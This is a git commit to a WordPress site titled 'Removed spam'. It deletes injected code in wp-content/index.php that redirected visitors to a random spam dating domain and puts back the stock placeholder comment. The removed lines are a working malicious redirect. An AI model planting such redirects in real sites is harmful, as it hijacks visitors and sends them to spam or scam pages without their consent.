96e0f17c2edc4725fba8d942c1ad72bae75f2df2
nicolocaruso85 <nicolaiphone@live.it>
2022-03-29 19:27:32 +0200

    Removed spam

--- wp-content/index.php
+++ wp-content/index.php
@@ -1,11 +1,3 @@
 <?php
-$urls = array("vipamor.bid",
-              "topsingles.work",
-              "findlight.date",
-              "websweet.date",
-              "lovechanse.win");
-$url = $urls[array_rand($urls)];
-header("Location: http://$url");
-echo "Loading...please wait";
+// Silence is golden.
 ?>
-
